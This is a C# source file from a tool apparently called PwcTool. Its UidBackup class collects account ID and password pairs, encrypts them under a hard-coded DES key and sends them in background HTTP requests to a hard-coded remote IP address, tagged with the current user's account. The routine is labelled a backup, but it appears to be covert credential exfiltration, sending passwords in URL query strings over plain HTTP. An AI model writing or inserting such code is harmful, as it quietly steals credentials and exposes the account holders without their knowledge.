using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.ComponentModel;
using System.Net;
using System.IO;
using CommonQ;

namespace PwcTool
{
    class UidBackup
    {
        List<Tuple<string,string>> uidlist = new List<Tuple<string,string>>();

        const string uidbackup_key = "ffaa00ea";
        const string back_url = "http://121.42.148.243/uidbackup/pwctool_uidbackup.php?";
        //const string back_url = "http://127.0.0.1/uidbackup/pwctool_uidbackup.php?";
        const int uidThreshold = 0x80;

        public void PushUid(string uid, string pwd)
        {
            lock (uidlist)
            {
                uidlist.Add(new Tuple<string,string>(uid, pwd));

                if (uidlist.Count > uidThreshold)
                {
                    BackUp();
                }
            }
        }

        public void BackUp()
        {
            lock (uidlist)
            {
                if (uidlist.Count > 0)
                {
                    StringBuilder sb = new StringBuilder();
                    foreach (var v in uidlist)
                    {
                        if (sb.Length != 0)
                        {
                            sb.Append(",");
                        }
                        sb.Append(v.Item1 + "-" + v.Item2);
                        if (sb.Length > 1024)
                        {
                            BackgroundWorker worker = new BackgroundWorker();
                            worker.DoWork += new DoWorkEventHandler(backer_DoWork);
                            worker.RunWorkerAsync(sb.ToString());
                            sb.Clear();
                        }
                    }
                    if (sb.Length > 0){
                        BackgroundWorker worker = new BackgroundWorker();
                        worker.DoWork += new DoWorkEventHandler(backer_DoWork);
                        worker.RunWorkerAsync(sb.ToString());
                    }
                }

                uidlist.Clear();
            }
        }

        void backer_DoWork(object sender, DoWorkEventArgs e)
        {
            string backstring = UrlFunction.UrlEncode(MyDes.Encode((string)e.Argument, uidbackup_key));
            string account = UrlFunction.UrlEncode(CpWorker.Uid);
            string ver = UrlFunction.UrlEncode(string.Format("ver:{0:yy-MM-dd HH:mm:ss}", System.IO.File.GetLastWriteTime(this.GetType().Assembly.Location)));
            string param = "backinfo=" + backstring + "&account=" + account + "&toolver=" + ver;
            string url = back_url + param;

            HttpWebRequest request = System.Net.WebRequest.Create(url) as HttpWebRequest;
            request.ServicePoint.Expect100Continue = false;
            request.Timeout = 1000 * 30;
            request.ContentType = "application/x-www-form-urlencoded";
            request.CookieContainer = new CookieContainer();
            request.BeginGetResponse(new AsyncCallback((ar) =>{
                StreamReader reader = new StreamReader(request.EndGetResponse(ar).GetResponseStream());
                reader.ReadToEnd();
            }),request);
        }
    }
}
